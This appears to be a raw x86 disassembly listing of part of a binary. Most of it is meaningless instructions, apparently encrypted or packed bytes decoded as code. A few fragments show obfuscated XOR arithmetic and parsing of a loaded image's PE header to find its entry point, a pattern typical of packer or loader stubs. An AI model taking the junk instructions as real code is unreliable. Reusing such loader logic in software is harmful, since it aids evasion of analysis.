  418054:	mov    WORD PTR [eax],?
  418056:	cs int3 
  418058:	jne    0x4180a1
  41805a:	ins    DWORD PTR es:[edi],dx
  41805b:	(bad)  
  41805c:	lock or DWORD PTR [esi+0x21],0xffffffe2
  418061:	data16 xlat BYTE PTR ds:[ebx]
  418063:	inc    ebp
  418064:	cmp    eax,0x4bf25e9
  418069:	jnp    0x418058
  41806b:	xchg   esp,eax
  41806c:	jmp    0x41804c
  41806e:	div    DWORD PTR [edx]
  418070:	add    al,0xe2
  418072:	mov    ch,0x91
  418075:	lahf   
  418076:	iret   
  418077:	xchg   BYTE PTR [edx],ch
  418079:	ffreep st(2)
  41807b:	or     eax,0xaf209b8f
  418080:	jne    0x41805e
  418082:	push   esp
  418083:	mov    eax,0x623f422
  418088:	add    al,0x39
  41808a:	or     DWORD PTR es:[ebx+0x1ceb771c],edi
  418091:	das    
  418092:	push   0x5b
  418094:	call   0x69f4:0x1e705bce
  41809b:	cmp    DWORD PTR ds:[edi+0x5a71dc4d],0xe324f322
  4180a6:	(bad)  
  4180a7:	std    
  4180a8:	sbb    bl,BYTE PTR [edx+0x1b]
  4180ab:	jmp    0xa692:0x127e85d6
  4180b2:	mov    ch,0x98
  4180b4:	das    
  4180b5:	stos   DWORD PTR es:[edi],eax
  4180b6:	pop    ecx
  4180b7:	pop    ebx
  4180b8:	mov    esp,0x162baa32
  4180bd:	sahf   
  4180be:	test   eax,0xd2a9b981
  4180c3:	jne    0x4180bb
  4180c5:	adc    DWORD PTR [ecx+ebp*4-0x10],ecx
  4180c9:	dec    ebp
  4180ca:	mov    esi,0xe61dee88
  4180cf:	(bad)
  4180d2:	or     eax,0x4c888911
  4180d7:	ins    BYTE PTR es:[edi],dx
  4180d8:	and    eax,ebx
  4180da:	cmc    
  4180db:	test   BYTE PTR [ecx],cl
  4180dd:	jno    0x418146
  4180df:	xchg   edx,eax
  4180e0:	xchg   esp,eax
  4180e1:	dec    ecx
  4180e2:	(bad)
  4180e6:	push   0x2d
  4180e8:	mov    edx,0x27d9ea16
  4180ed:	retf   0x4669
  4180f0:	jo     0x418110
  4180f2:	call   0x3b03:0xde22d51a
  4180f9:	ss test eax,0xa17b6c70
  4180ff:	sbb    eax,0xe3ed1801
  418104:	mov    ch,0xc5
  418106:	xchg   edi,eax
  418107:	ss xchg ebp,eax
  418109:	cld    
  41810a:	or     bh,al
  41810c:	push   esp
  41810d:	ds int 0xf3
  418110:	dec    ebx
  418111:	pop    ecx
  418112:	adc    al,0x8f
  418114:	out    dx,al
  418115:	cmp    ah,dl
  418117:	mov    ecx,0x975938c7
  41811c:	fsub   QWORD PTR [esi+edi*4+0x44]
  418120:	push   es
  418121:	xor    bl,0x72
  418124:	ins    DWORD PTR es:[edi],dx
  418125:	fstp   QWORD PTR [esi+0x6d]
  418128:	cmp    DWORD PTR [ebp-0x6d],ebx
  41812b:	jmp    0x23e0:0x2dfdfae2
  418132:	cmp    ch,BYTE PTR [edx+ecx*1]
  418135:	xchg   esi,eax
  418136:	inc    ebx
  418137:	jns    0x4180de
  418139:	je     0x418164
  41813b:	adc    DWORD PTR [esi-0x6d1fec2c],ebp
  418141:	shl    ch,0xd1
  418144:	xchg   DWORD PTR [ebx],ebx
  418146:	not    ah
  418148:	lods   eax,DWORD PTR ds:[esi]
  418149:	js     0x41817c
  41814b:	mov    eax,ds:0xd3ff49a
  418150:	rcr    DWORD PTR [ebx],cl
  418152:	retf   
  418153:	sub    eax,0xa78abfb3
  418158:	ret    0xfae
  41815b:	cwde   
  41815c:	aaa    
  41815d:	inc    eax
  41815e:	test   eax,0x7992cdf8
  418163:	aam    0x57
  418165:	and    ch,BYTE PTR [edi-0x3d]
  418168:	ins    DWORD PTR es:[edi],dx
  418169:	lock inc esi
  41816b:	dec    ebp
  41816c:	xchg   ebx,eax
  41816d:	xchg   ebp,eax
  41816e:	les    eax,FWORD PTR [esi-0x6e]
  418171:	jle    0x4180fb
  418173:	mov    edx,0x6160b9f6
  418178:	mov    bl,0xad
  41817a:	fldenv [esi]
  41817c:	inc    ecx
  41817d:	iret   
  41817e:	xchg   esp,eax
  41817f:	inc    ebp
  418180:	add    edi,ebx
  418182:	jg     0x418183
  418184:	xchg   esi,eax
  418185:	ret    0xa5fd
  418188:	test   DWORD PTR [edi],0xf611d92b
  41818e:	jb     0x418186
  418190:	nop
  418191:	add    bl,cl
  418193:	loopne 0x4181d7
  418195:	push   ds
  418196:	mov    esi,DWORD PTR [ebp+0xc]
  418199:	xor    ecx,eax
  41819b:	xor    esi,eax
  41819d:	lea    ecx,[esi+ecx*1+0x327298]
  4181a4:	xor    ecx,eax
  4181a6:	jmp    0x4184c0
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	fdiv   DWORD PTR [ebx+0x3419176e]
  4181bd:	jg     0x418237
  4181bf:	jnp    0x41823f
  4181c1:	js     0x41823b
  4181c3:	ret    
  4181c4:	aaa    
  4181c5:	push   0xffffffb9
  4181c7:	sbb    edx,ecx
  4181c9:	sub    al,BYTE PTR [edi]
  4181cb:	out    0x48,al
  4181cd:	cmp    DWORD PTR ss:[esi],ebp
  4181d0:	jae    0x41818e
  4181d2:	mov    bl,bh
  4181d4:	pop    esi
  4181d5:	fsubr  DWORD PTR [edx-0x74]
  4181d8:	pop    eax
  4181d9:	mul    DWORD PTR [eax]
  4181db:	mov    dl,0x2e
  4181dd:	pop    ebp
  4181de:	ret    0x59de
  4181e1:	(bad)  
  4181e2:	outs   dx,BYTE PTR ds:[esi]
  4181e3:	retf   0xd62
  4181e6:	jecxz  0x418231
  4181e8:	sbb    DWORD PTR [ebx],0xa
  4181eb:	adc    dl,ah
  4181ed:	fucom  st(6)
  4181ef:	ins    DWORD PTR es:[edi],dx
  4181f0:	and    cl,BYTE PTR [esi-0x33]
  4181f3:	call   0xb961:0xeb3fee33
  4181fa:	std    
  4181fb:	out    dx,al
  4181fc:	or     eax,0xeb86d6de
  418201:	aas    
  418202:	lods   eax,DWORD PTR ds:[esi]
  418203:	test   ch,bl
  418205:	rcr    DWORD PTR [ebx-0x79f3f2ba],cl
  41820b:	cs ja  0x41822b
  41820e:	or     DWORD PTR [esi+edx*2+0x18],0xffffffe3
  418213:	pop    ecx
  418214:	mov    DWORD PTR [eax],eax
  418216:	pop    edi
  418217:	jbe    0x4181d5
  418219:	in     eax,0x8a
  41821b:	jecxz  0x418241
  41821d:	(bad)  
  41821e:	cmp    esp,DWORD PTR [bx+si+0x2727]
  418223:	rol    BYTE PTR [eax],1
  418225:	xchg   DWORD PTR ds:0xc64335ff,edi
  41822b:	lahf   
  41822c:	and    edx,ebx
  41822e:	neg    BYTE PTR [eax]
  418230:	xor    DWORD PTR [eax],ebx
  418232:	jno    0x41823a
  418234:	xchg   ebx,eax
  418235:	ss pusha 
  418237:	pop    ebx
  418238:	dec    ecx
  418239:	mov    esp,0x4be63b65
  41823e:	push   cs
  41823f:	xchg   esi,eax
  418240:	rcl    DWORD PTR [edx+0x5130b532],cl
  418246:	xor    ebp,DWORD PTR ds:0x167dddd4
  41824c:	xor    BYTE PTR [ebx+0x0],cl
  41824f:	dec    cx
  418251:	xor    eax,0x69728edc
  418256:	loopne 0x4181e4
  418258:	fistp  DWORD PTR [esi-0x21834c95]
  41825e:	jbe    0x418270
  418260:	push   cs
  418261:	xor    ecx,ebx
  418263:	hlt    
  418264:	mov    ds:0x24826786,al
  418269:	xchg   edi,eax
  41826a:	call   0xa00f:0xc0999506
  418271:	push   edi
  418272:	xchg   cl,ch
  418274:	mov    bl,0x17
  418276:	mov    al,0x96
  418278:	hlt    
  418279:	addr16 xor al,0x11
  41827c:	pop    edi
  41827d:	add    al,bl
  41827f:	jg     0x41822a
  418281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418282:	dec    edi
  418283:	icebp  
  418284:	call   0xf0bbb14a
  418289:	pop    eax
  41828a:	ja     0x4182ef
  41828c:	adc    ax,0x1a12
  418290:	clc    
  418291:	push   esi
  418292:	aad    0xd6
  418294:	push   cs
  418295:	jmp    0x418301
  418297:	fild   WORD PTR [eax]
  418299:	outs   dx,DWORD PTR ds:[esi]
  41829a:	inc    ebx
  41829b:	xchg   BYTE PTR [eax+0x3a],ah
  41829e:	xchg   BYTE PTR [edi-0x6b67980c],ah
  4182a4:	stos   DWORD PTR es:[edi],eax
  4182a5:	pop    ss
  4182a6:	add    BYTE PTR [ebx-0x72e4183b],cl
  4182ac:	shr    DWORD PTR [ecx],0xa6
  4182af:	push   ebp
  4182b0:	bound  eax,QWORD PTR [eax+0x3e]
  4182b3:	ror    BYTE PTR [edx+ebp*4+0x317d2621],0xd5
  4182bb:	out    dx,al
  4182bc:	sub    bh,BYTE PTR [edx]
  4182be:	icebp  
  4182bf:	and    BYTE PTR [eax+edx*4-0xf4d467],bh
  4182c6:	xchg   BYTE PTR [edi-0x477d9ae1],ch
  4182cc:	xchg   ecx,eax
  4182cd:	shr    cl,cl
  4182cf:	scas   eax,DWORD PTR es:[edi]
  4182d0:	sbb    BYTE PTR [esi-0x63572cb],bh
  4182d6:	dec    ebp
  4182d7:	mov    edx,0xa9ef0938
  4182dc:	shl    DWORD PTR [ebx-0x34f8f4e7],cl
  4182e2:	ret    
  4182e3:	sbb    eax,0x5546df47
  4182e8:	push   ds
  4182e9:	mov    ds:0xeb73105d,eax
  4182ee:	xor    al,0x3
  4182f0:	not    DWORD PTR [edx+0x24317ced]
  4182f6:	fdivrp st(5),st
  4182f8:	add    BYTE PTR [eax+0xd],dl
  4182fb:	jmp    0x74f467fb
  418300:	push   ss
  418301:	ins    BYTE PTR es:[edi],dx
  418302:	loopne 0x41828f
  418304:	cmp    bl,BYTE PTR [eax+0x1d629a2]
  41830a:	jb     0x418328
  41830c:	mov    eax,ds:0x64f841b0
  418311:	or     ebx,DWORD PTR [ecx-0x52]
  418314:	in     al,dx
  418315:	push   eax
  418316:	imul   ebx,DWORD PTR ds:0xb4ca4efb,0xffffffee
  41831d:	call   0x8af1:0x9768dea3
  418324:	pop    edx
  418325:	mov    ecx,0xfa66579
  41832a:	loopne 0x418386
  41832c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41832d:	jmp    0xd91249d7
  418332:	mov    gs,WORD PTR [edi+0x6e112ebf]
  418338:	inc    esp
  418339:	not    eax
  41833b:	mov    al,ds:0x71b089d6
  418340:	(bad)  
  418341:	mov    eax,0xfb50ea31
  418346:	out    0x3,al
  418348:	mov    ecx,0x174e1f4d
  41834d:	jnp    0x418398
  41834f:	sub    ch,BYTE PTR [esi-0x37aceccf]
  418355:	cli    
  418356:	sub    al,0xd9
  418358:	ja     0x41832e
  41835a:	pusha  
  41835b:	mov    esi,0x4e616aa8
  418360:	in     al,dx
  418361:	mov    edi,0xe067ec40
  418366:	in     al,dx
  418367:	jecxz  0x418343
  418369:	and    al,0x2
  41836b:	leave  
  41836c:	ret    
  41836d:	mov    dh,BYTE PTR [eax+0x1]
  418370:	daa    
  418371:	adc    DWORD PTR [ebx],edi
  418373:	jmp    0x418364
  418375:	retf   0x34a5
  418378:	xchg   DWORD PTR [eax-0x2f01953f],ebx
  41837e:	in     al,0xef
  418380:	ret    0x5c52
  418383:	aad    0x41
  418385:	mov    dl,0x22
  418387:	xor    DWORD PTR ds:0x85c8f691,0x18
  41838e:	(bad)  
  41838f:	ror    DWORD PTR [edx+edx*1],1
  418392:	int3   
  418393:	addr16 xchg esp,eax
  418395:	lock inc ecx
  418397:	mov    edi,0xca7be28d
  41839c:	add    edx,DWORD PTR [ecx]
  41839e:	pop    ecx
  41839f:	aaa    
  4183a0:	jge    0x41836c
  4183a2:	sbb    BYTE PTR [ecx],bh
  4183a4:	mov    BYTE PTR [edi+0x522f02ec],bh
  4183aa:	ja     0x418412
  4183ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183ad:	sbb    eax,0xf3dfcc89
  4183b2:	in     al,dx
  4183b3:	clc    
  4183b4:	xlat   BYTE PTR ds:[ebx]
  4183b5:	or     edi,DWORD PTR [ecx+0x140a7c3d]
  4183bb:	jne    0x418358
  4183bd:	pop    ebp
  4183be:	and    ecx,DWORD PTR [edi+ebx*2+0x4b]
  4183c2:	mov    ebp,0x88a69f9c
  4183c7:	mov    bl,0x62
  4183c9:	(bad)  
  4183ca:	mov    edx,0xfdd247fd
  4183cf:	(bad)  
  4183d0:	and    al,0x9e
  4183d2:	rol    ebx,0x33
  4183d5:	push   0xffffff96
  4183d7:	or     al,0x72
  4183d9:	ret    0x32e1
  4183dc:	push   0x8
  4183de:	and    DWORD PTR [ebp+0x39],ebp
  4183e1:	test   al,0xee
  4183e3:	out    dx,eax
  4183e4:	mov    cl,cl
  4183e6:	push   esi
  4183e7:	xlat   BYTE PTR ds:[ebx]
  4183e8:	pop    ecx
  4183e9:	sti    
  4183ea:	fiadd  DWORD PTR [eax]
  4183ec:	xchg   ebx,eax
  4183ed:	imul   eax,DWORD PTR [eax+edi*2],0x7c
  4183f1:	mov    dl,dh
  4183f3:	dec    ecx
  4183f4:	lahf   
  4183f5:	add    al,0xd2
  4183f7:	out    0x7c,eax
  4183f9:	cmp    al,0x24
  4183fb:	pop    ds
  4183fc:	rol    DWORD PTR [ecx+0x79223939],1
  418402:	cmp    DWORD PTR ss:[ebp+0x150e97b2],0xffffffcc
  41840a:	test   DWORD PTR [edi-0x6a00ba2f],esp
  418410:	aam    0x3e
  418412:	(bad)  
  418413:	popa   
  418414:	shl    ch,cl
  418416:	adc    BYTE PTR [edx+0x55],dh
  418419:	jnp    0x418438
  41841b:	cwde   
  41841c:	jno    0x418450
  41841e:	stos   DWORD PTR es:[edi],eax
  41841f:	shl    ecx,0xfc
  418422:	shr    eax,1
  418424:	pusha  
  418425:	lea    ebp,[ebx]
  418427:	dec    ebx
  418428:	pop    eax
  418429:	inc    ecx
  41842a:	(bad)  
  41842b:	ins    BYTE PTR es:[edi],dx
  41842c:	test   al,0xf4
  41842e:	shl    BYTE PTR es:[edx],0xd9
  418432:	nop
  418433:	jecxz  0x418437
  418435:	int3   
  418436:	push   edi
  418437:	aaa    
  418438:	jmp    0xa366:0x45f1402b
  41843f:	ins    DWORD PTR es:[edi],dx
  418440:	lds    edi,FWORD PTR [edx+0x4e77f80f]
  418446:	gs xor al,0x38
  418449:	(bad)  
  41844a:	jmp    0x467f:0x279ce1d5
  418451:	ds jae 0x41849a
  418454:	sbb    eax,0x5028320
  418459:	adc    BYTE PTR cs:[eax],dh
  41845c:	mov    ss,WORD PTR [esi+0x2a]
  41845f:	out    0x1d,eax
  418461:	jae    0x418461
  418463:	shl    BYTE PTR [esi+0x2a],1
  418466:	dec    edx
  418467:	pop    edi
  418468:	dec    edx
  418469:	and    al,0xb3
  41846b:	mov    ecx,0x1c9cdae4
  418470:	js     0x4184a6
  418472:	test   eax,0x62f0cce6
  418477:	jmp    0xebf267a9
  41847c:	(bad)  
  41847d:	sbb    edi,edi
  41847f:	dec    eax
  418480:	int    0x22
  418482:	test   al,0xae
  418484:	fsub   st,st(3)
  418486:	(bad)  
  41848a:	mov    ecx,0x305200e3
  41848f:	icebp  
  418490:	popa   
  418491:	lahf   
  418492:	sbb    DWORD PTR ds:0xcc280ad,esp
  418498:	test   BYTE PTR [eax+0x3],ah
  41849b:	cmp    edx,esp
  41849d:	or     ecx,DWORD PTR [ebx+eiz*4+0x2b]
  4184a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184a2:	sbb    BYTE PTR [eax+eiz*4],ch
  4184a5:	int    0x7f
  4184a7:	inc    esp
  4184a8:	dec    ecx
  4184a9:	cmp    esi,DWORD PTR [esp+ebx*1+0x3b]
  4184ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184ae:	aad    0x1
  4184b0:	mov    al,0x6
  4184b2:	xor    al,0x2d
  4184b4:	inc    edi
  4184b5:	mov    esp,0x59dc8ff5
  4184ba:	in     al,0x5b
  4184bc:	and    ebx,DWORD PTR [ecx]
  4184be:	xchg   ebx,eax
  4184bf:	repz cmp ecx,0xf89c8528
  4184c6:	jne    0x417e12
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0x73ec6d48
  4184e3:	mov    al,0xa4
  4184e5:	(bad)  
  4184e6:	adc    al,0x39
  4184e8:	jg     0x418562
  4184ea:	jnp    0x41856a
  4184ec:	js     0x418566
  4184ee:	ret    0x328f
  4184f1:	pop    es
  4184f2:	cmp    eax,0x63a650b5
  4184f7:	cs inc ebx
  4184f9:	sar    cl,0xa2
  4184fc:	jmp    0x6a03:0x6420579d
  418503:	mov    dl,0x4e
  418505:	les    esi,FWORD PTR [ebx-0x156ef3bb]
  41850b:	call   0x42404b7f
  418510:	adc    edx,esi
  418512:	or     eax,edi
  418514:	retf   
  418515:	fidiv  DWORD PTR [eax]
  418517:	jge    0x418536
  418519:	pop    edi
  41851a:	imul   edx,eax,0x5b
  41851d:	sub    eax,esp
  41851f:	adc    ah,ah
  418521:	cmp    dh,dl
  418523:	pop    eax
  418524:	fisttp DWORD PTR ds:0x3c7ffb37
  41852a:	fld    QWORD PTR [edx-0x7085690c]
  418530:	sti    
  418531:	stc    
  418532:	ins    DWORD PTR es:[edi],dx
  418533:	repnz imul edi,DWORD PTR [ebx],0x21
  418537:	adc    edx,ecx
  418539:	mov    al,ds:0x25ffc886
  41853e:	out    dx,eax
  41853f:	push   ebp
  418540:	outs   dx,DWORD PTR ds:[esi]
  418541:	shl    BYTE PTR [edi],0x73
  418544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418545:	sub    DWORD PTR [ebx-0x185b2de7],edi
  41854b:	xchg   ecx,eax
  41854c:	cmp    DWORD PTR [esi-0x3e],0x19496b9d
  418553:	push   edi
  418554:	daa    
  418555:	sub    BYTE PTR [edi],al
  418557:	inc    esp
  418558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418559:	sub    al,0x79
  41855b:	xchg   ecx,eax
  41855c:	push   es
  41855d:	out    dx,al
  41855e:	or     DWORD PTR [edx+0x47f2c20a],0xb51b7a79
  418568:	xor    ebp,ecx
  41856a:	hlt    
  41856b:	xchg   ebp,eax
  41856d:	aad    0x80
  41856f:	mov    esi,0x6bdab54d
  418574:	push   esp
  418575:	rcl    BYTE PTR ds:[esp+ebx*8+0x5a965a23],cl
  41857d:	shl    DWORD PTR [ecx],cl
  41857f:	dec    esi
  418580:	retf   
  418581:	inc    esp
  418582:	push   esp
  418583:	jp     0x4185ee
  418585:	xchg   esi,eax
  418586:	popa   
  418587:	popf   
  418588:	(bad)  
  418589:	out    dx,eax
  41858a:	lods   eax,DWORD PTR ds:[esi]
  41858b:	loop   0x41854d
  41858d:	imul   ebp,edx,0xf47af48a
  418593:	das    
  418594:	xor    bh,bh
  418596:	enter  0xf4ba,0x2d
  41859a:	mov    ds:0x46443ca3,eax
  41859f:	or     dl,cl
  4185a1:	inc    edx
  4185a2:	jb     0xb8a18c17
  4185a8:	fidivr WORD PTR [edi-0x60636be8]
  4185ae:	push   eax
  4185af:	ret    
  4185b0:	pop    ebx
  4185b1:	and    edi,esi
  4185b3:	in     al,dx
  4185b4:	daa    
  4185b5:	rcl    BYTE PTR [ebx-0x7b],1
  4185b8:	loop   0x418584
  4185ba:	mov    ebx,0x6653fefe
  4185bf:	fisub  WORD PTR [eax]
  4185c1:	outs   dx,BYTE PTR ds:[esi]
  4185c2:	shl    BYTE PTR [esi+0x7b67a6a8],0xe
  4185c9:	stos   BYTE PTR es:[edi],al
  4185ca:	pop    ebp
  4185cb:	adc    dh,dl
  4185cd:	xchg   DWORD PTR [edx+0x20b9ac92],edi
  4185d3:	mov    al,ds:0x7c05b1b3
  4185d8:	sar    DWORD PTR [ecx],cl
  4185da:	cmc    
  4185db:	aad    0xb
  4185dd:	sbb    eax,0x475a0813
  4185e2:	das    
  4185e3:	imul   eax,DWORD PTR [edi+0x9190bb6],0xffffff8b
  4185ea:	pop    es
  4185eb:	jae    0x418644
  4185ed:	ja     0x4185f7
  4185ef:	ins    BYTE PTR es:[edi],dx
  4185f0:	jns    0x4185d4
  4185f2:	call   0xc9d7:0x156f8611
  4185f9:	xchg   ebp,eax
  4185fa:	jmp    0x666a572
  4185ff:	gs pop esi
  418601:	into   
  418602:	(bad)  
  418603:	popa   
  418604:	cmp    DWORD PTR ds:0x62e6ab2e,esp
  41860a:	std    
  41860b:	xor    eax,0xabe0dd0f
  418610:	sub    al,BYTE PTR [esi-0x1e03e5f4]
  418616:	sub    BYTE PTR [edi],dl
  418618:	not    bh
  41861a:	fs push 0x85c92623
  418620:	inc    ecx
  418621:	test   DWORD PTR [edi+0x3d0e6753],esp
  418627:	mov    ds:0x9248d41d,al
  41862c:	imul   esi,DWORD PTR [ebx-0x35],0xfffffffa
  418630:	pop    esi
  418631:	lods   al,BYTE PTR ds:[esi]
  418632:	sub    al,0x2f
  418634:	pop    ebp
  418635:	xchg   BYTE PTR [esp+ecx*8-0x75],dh
  418639:	jecxz  0x41868b
  41863b:	int3   
  41863c:	cmc    
  41863d:	push   ds
  41863e:	mov    ebp,0x85fcb925
  418643:	xchg   ecx,eax
  418644:	sbb    eax,DWORD PTR ds:0x21f6f626
  41864a:	ins    DWORD PTR es:[edi],dx
  41864b:	jp     0x418643
  41864d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41864e:	popa   
  41864f:	dec    ebp
  418650:	and    cl,cl
  418652:	les    ecx,FWORD PTR [ebx+0x73]
  418655:	jo     0x4185f9
  418657:	jp     0x4186ac
  418659:	mov    al,ds:0x26238231
  41865e:	push   ds
  41865f:	add    al,0x11
  418661:	popf   
  418662:	cmp    ch,BYTE PTR [ecx-0x4c9aedb3]
  418668:	dec    eax
  418669:	clc    
  41866a:	(bad)  
  41866c:	mov    al,BYTE PTR [esi+0x4b217b1]
  418672:	lods   eax,DWORD PTR ds:[esi]
  418673:	or     eax,0x7a9176b
  418678:	in     al,dx
  418679:	(bad)  [edi+0x78]
  41867c:	jae    0x4186f8
  41867e:	stos   BYTE PTR es:[edi],al
  41867f:	mov    esp,0x7dda7c57
  418684:	jecxz  0x4186a2
  418686:	mov    ch,0x2b
  418688:	pop    ss
  418689:	les    ebx,FWORD PTR [esi]
  41868b:	inc    esp
  41868c:	push   esi
  41868d:	jb     0x418616
  41868f:	sub    eax,edx
  418691:	aaa    
  418692:	clc    
  418693:	sahf   
  418694:	(bad)  
  418695:	sbb    al,0x6d
  418697:	or     eax,0x8a20eee1
  41869c:	(bad)
  4186a0:	imul   esi,DWORD PTR [edx],0xb037c1ef
  4186a6:	outs   dx,BYTE PTR ds:[esi]
  4186a7:	scas   al,BYTE PTR es:[edi]
  4186a8:	out    dx,al
  4186a9:	pop    esp
  4186aa:	into   
  4186ab:	frstor [esp+ebx*4+0x128ff99a]
  4186b2:	mov    al,0xe3
  4186b4:	jae    0x418657
  4186b6:	(bad)  
  4186b8:	mov    cl,ch
  4186ba:	add    esi,esp
  4186bc:	add    BYTE PTR [ecx],ch
  4186be:	or     ch,dh
  4186c0:	aaa    
  4186c1:	dec    ecx
  4186c2:	in     al,dx
  4186c3:	enter  0x3967,0x30
  4186c7:	(bad)  
  4186c9:	(bad)  
  4186ca:	enter  0xba99,0x74
  4186ce:	xor    DWORD PTR [ecx-0x4b],esi
  4186d1:	mov    eax,ds:0x57b6a8f0
  4186d6:	mov    al,ds:0x51758974
  4186db:	sub    esp,DWORD PTR [edx]
  4186dd:	in     al,dx
  4186de:	dec    esi
  4186df:	push   ss
  4186e0:	jmp    0x3a8e:0x587e1fed
  4186e7:	dec    edi
  4186e8:	sub    ebx,DWORD PTR gs:[ebx+0x2585db9d]
  4186ef:	or     BYTE PTR [eax+ebp*4],bl
  4186f2:	in     al,dx
  4186f3:	mov    bl,0xd
  4186f5:	mov    cl,0x36
  4186f7:	out    0x64,al
  4186f9:	in     al,dx
  4186fa:	dec    eax
  4186fb:	addr16 sti 
  4186fd:	test   DWORD PTR [ebp-0xf],ecx
  418700:	dec    ebp
  418701:	mov    ebp,0x2bd1db77
  418706:	or     ebx,ebp
  418708:	push   cs
  418709:	jns    0x418694
  41870b:	sbb    eax,esp
  41870d:	jg     0x4186d9
  41870f:	adc    DWORD PTR [eax-0x1a],esi
  418712:	cmp    eax,0xe6836c3d
  418717:	sar    eax,0xe8
  41871a:	ins    BYTE PTR es:[edi],dx
  41871b:	cmp    eax,0x209990b0
  418720:	mov    edi,0xb232ed71
  418725:	pop    edi
  418726:	adc    DWORD PTR [esi+0x6dfa4001],0x8e862aab
  418730:	sbb    ecx,DWORD PTR [eax-0xb]
  418733:	add    DWORD PTR [ebx+0x7c],edx
  418736:	jge    0x4186c7
  418738:	in     al,0x1b
  41873a:	jg     0x418739
  41873c:	xlat   BYTE PTR ds:[ebx]
  41873d:	fcomp  DWORD PTR ds:0xc2fee086
  418743:	mov    al,0x41
  418745:	call   FWORD PTR [ecx-0x76999c25]
  41874b:	mov    dl,BYTE PTR [ebx+edx*1-0x74]
  41874f:	and    eax,0xeeb90963
  418754:	in     eax,dx
  418755:	out    0x57,eax
  418757:	outs   dx,DWORD PTR ds:[esi]
  418758:	push   ecx
  418759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41875a:	xchg   ebp,eax
  41875b:	xor    al,0xc
  41875d:	dec    esi
  41875e:	push   0x3cb540a2
  418763:	sbb    BYTE PTR [edx+0x19c9d407],bh
  418769:	jbe    0x4186fa
  41876b:	cmp    ah,bh
  41876d:	mov    edx,0xbc40bc3
  418772:	scas   al,BYTE PTR es:[edi]
  418773:	mov    eax,ds:0x94695dca
  418778:	not    ecx
  41877a:	mov    esi,DWORD PTR [edx+eiz*4]
  41877d:	mov    ds:0xeed25ff3,eax
  418782:	inc    esi
  418783:	inc    eax
  418784:	scas   al,BYTE PTR es:[edi]
  418785:	fcom   DWORD PTR [ebp+0x7778465e]
  41878b:	ins    DWORD PTR es:[edi],dx
  41878c:	int3   
  41878d:	ins    DWORD PTR es:[edi],dx
  41878e:	(bad)  
  41878f:	sbb    al,0xc9
  418791:	mov    cl,0x24
  418793:	out    dx,eax
  418794:	push   0x26365202
  418799:	mov    eax,ds:0x3af865fb
  41879e:	arpl   WORD PTR [eax],si
  4187a0:	fmul   DWORD PTR [ebx]
  4187a2:	sub    ebx,edi
  4187a4:	xor    eax,0xd4502b1d
  4187a9:	(bad)  
  4187aa:	and    edx,ebx
  4187ac:	bound  edx,QWORD PTR [ecx]
  4187ae:	int    0x39
  4187b0:	add    DWORD PTR [eax-0x16],0xce2c4bcd
  4187b7:	mov    WORD PTR [edx+esi*8-0x4fabec12],?
  4187be:	imul   eax,DWORD PTR [ebx],0xffffff99
  4187c1:	xchg   edi,eax
  4187c2:	fisttp WORD PTR [eax+eax*1+0x5ac87d6c]
  4187c9:	mov    ebx,ds
  4187cb:	mov    bl,bh
  4187cd:	adc    bh,dl
  4187cf:	mov    ah,0x35
  4187d1:	adc    cl,BYTE PTR [eax]
  4187d3:	adc    ebp,DWORD PTR [eax-0x4b]
  4187d6:	adc    BYTE PTR ds:0x45ac7c43,bl
  4187dc:	sbb    bh,BYTE PTR [eax+0x1f79141b]
  4187e2:	dec    ebx
  4187e3:	int3   
  4187e4:	jbe    0x4187f2
  4187e6:	cmp    BYTE PTR [ecx-0x7eac5a73],0xc1
  4187ed:	push   0x8bffcd8d
  4187f2:	icebp  
  4187f3:	xor    esi,eax
  4187f5:	add    esi,DWORD PTR [ebp+0x8]
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
  418837:	fcmove st,st(3)
  418839:	test   eax,0xe0711af2
  41883e:	loop   0x4188a6
  418840:	pop    ss
  418841:	ds jg  0x4188bc
  418844:	jnp    0x4188c4
  418846:	js     0x4188c0
  418848:	(bad)  
  418849:	sbb    eax,edx
  41884b:	rol    DWORD PTR [esi],0xaf
  41884e:	xor    BYTE PTR [edi],0x96
  418851:	ins    DWORD PTR es:[edi],dx
  418852:	inc    ebx
  418853:	sbb    DWORD PTR [edi+ebp*8],esi
  418856:	aad    0xb3
  418858:	add    al,0xc7
  41885a:	mov    edi,0x25fe94c0
  41885f:	retf   
  418860:	push   cs
  418861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418862:	and    esp,ecx
  418864:	sbb    BYTE PTR [ecx],cl
  418866:	dec    ecx
  418867:	fsubr  DWORD PTR [edi+0x208ab6bc]
  41886d:	mov    ebp,0xbf533cda
  418872:	int    0x1d
  418874:	ror    BYTE PTR [esi+0x79fed42a],1
  41887a:	popa   
  41887b:	mov    dh,0xe8
